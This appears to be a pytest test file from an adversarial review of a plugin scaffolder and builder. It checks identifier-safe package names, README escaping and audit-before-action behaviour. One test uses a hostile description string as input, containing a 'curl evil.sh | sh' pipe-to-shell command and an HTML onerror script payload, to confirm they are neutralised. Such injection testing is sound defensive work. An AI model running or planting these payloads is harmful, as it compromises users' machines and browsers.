"""Epic I-11 adversarial review round 2 - plugin builder audit + scaffold output
(R2-SC-06/07, R2-AP-04/05/06)."""
from __future__ import annotations

import ast
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from core.plugins.plugin_builder.scaffolding import enhanced_scaffolder as es
from core.plugins.plugin_builder.scaffolding.enhanced_scaffolder import bootstrap_scaffold


def _refuse(stage_to_refuse):
    import audit

    real = audit.audit_event

    def fake(event_type, details=None, **kw):
        if (details or {}).get("stage") == stage_to_refuse:
            return False
        return real(event_type, details=details, **kw)
    return fake


class TestScaffoldOutput:
    def test_digit_leading_id_yields_importable_module_dir(self, tmp_path):
        files = bootstrap_scaffold(output_dir=tmp_path, plugin_id="1password", plugin_name="One")
        pkg = files["plugin"].parent
        assert pkg.name.isidentifier(), pkg.name   # R2-SC-06: "1password" is not importable
        for py in pkg.rglob("*.py"):
            ast.parse(py.read_text(encoding="utf-8"), filename=str(py))

    def test_readme_carries_names_as_text_not_markup(self, tmp_path):
        evil = "Demo\n\n## Installation\ncurl evil.sh | sh <img src=x onerror=alert(1)>"
        files = bootstrap_scaffold(output_dir=tmp_path, plugin_id="my.plugin", plugin_name="Demo",
                                   description=evil, author="A <b>bold</b>")
        readme = (files["plugin"].parent / "README.md").read_text(encoding="utf-8")
        assert "<img" not in readme and "<b>" not in readme          # R2-SC-07
        assert "\n## Installation\ncurl" not in readme
        assert not any(line.startswith("curl evil.sh") for line in readme.splitlines())


class TestScaffoldAuditFirst:
    def test_refused_start_record_writes_nothing(self, tmp_path, monkeypatch):
        import audit
        monkeypatch.setattr(audit, "audit_event", _refuse("scaffold_started"))
        out = tmp_path / "scaffold-out"  # tmp_path also holds the conftest's sandbox CORVIN_HOME
        with pytest.raises(RuntimeError):
            bootstrap_scaffold(output_dir=out, plugin_id="my.plugin", plugin_name="X")
        assert not [p for p in out.rglob("*") if p.is_file()], "files written without a record"


class TestDevelopmentAudit:
    def _plan(self, **kw):
        from core.plugins.plugin_builder.v2_integration import PluginDevelopmentPlan
        return PluginDevelopmentPlan(plugin_id="my.plugin", plugin_name="X", tenant_id="_default",
                                     steps=["scaffold"], register_with_architecture=False, **kw)

    def test_refused_phase_start_does_not_run_the_phase(self, tmp_path, monkeypatch):
        import audit
        from core.plugins.plugin_builder.v2_integration import PluginDeveloper
        monkeypatch.setattr(audit, "audit_event", _refuse("phase_scaffold_started"))
        out = tmp_path / "out"
        res = PluginDeveloper().develop(self._plan(), out)
        assert res.success is False and res.scaffold_dir is None
        assert not any(p.is_file() for p in out.rglob("*"))

    def test_refused_opening_record_creates_no_directory(self, tmp_path, monkeypatch):
        import audit
        from core.plugins.plugin_builder.v2_integration import PluginDeveloper
        monkeypatch.setattr(audit, "audit_event", _refuse("development_started"))
        out = tmp_path / "never"
        res = PluginDeveloper().develop(self._plan(), out)
        assert res.success is False and not out.exists()

    def test_refused_completion_record_is_not_a_success(self, tmp_path, monkeypatch):
        import audit
        from core.plugins.plugin_builder.v2_integration import PluginDeveloper
        monkeypatch.setattr(audit, "audit_event", _refuse("development_completed"))
        res = PluginDeveloper().develop(self._plan(), tmp_path / "o")
        assert res.success is False

    def test_audit_enabled_false_still_audits(self, tmp_path):
        from core.plugins.plugin_builder.v2_integration import PluginDeveloper
        res = PluginDeveloper().develop(self._plan(audit_enabled=False), tmp_path / "o")
        stages = [e["event_type"] for e in res.audit_events]
        assert stages[0] == "development_started" and stages[-1] == "development_completed"


class TestBuildCompletedMustCommit:
    def test_uncommitted_build_completed_is_a_failure(self, tmp_path, monkeypatch):
        from core.plugins.plugin_builder.build_system import builder as b
        files = bootstrap_scaffold(output_dir=tmp_path, plugin_id="my.plugin", plugin_name="X")
        pdir = files["plugin"].parent

        def fake_run(cmd, cwd=None, **kw):
            dist = Path(cwd) / "dist"
            dist.mkdir(exist_ok=True)
            (dist / "corvin_my_plugin-0.1.0-py3-none-any.whl").write_bytes(b"PK\x05\x06" + b"\0" * 18)
            return SimpleNamespace(returncode=0, stderr="", stdout="")
        monkeypatch.setattr(b.subprocess, "run", fake_run)
        monkeypatch.setattr(b.PackageBuilder, "_validate_wheel_structure", lambda self, p: (True, []),
                            raising=False)
        real = b.PackageBuilder._write_audit_event

        def write(self, event_type, data):
            if event_type == "build_completed":
                raise RuntimeError("not committed")
            return real(self, event_type, data)
        monkeypatch.setattr(b.PackageBuilder, "_write_audit_event", write)
        cfg = b.BuildConfig(tenant_id="_default", skill_id="plugin-my.plugin")
        res = b.PackageBuilder(pdir, cfg, b.PackageMetadata(name="corvin-my.plugin", version="0.1.0")).build()
        assert res.success is False
        assert any("build_completed" in e for e in (res.errors or []))
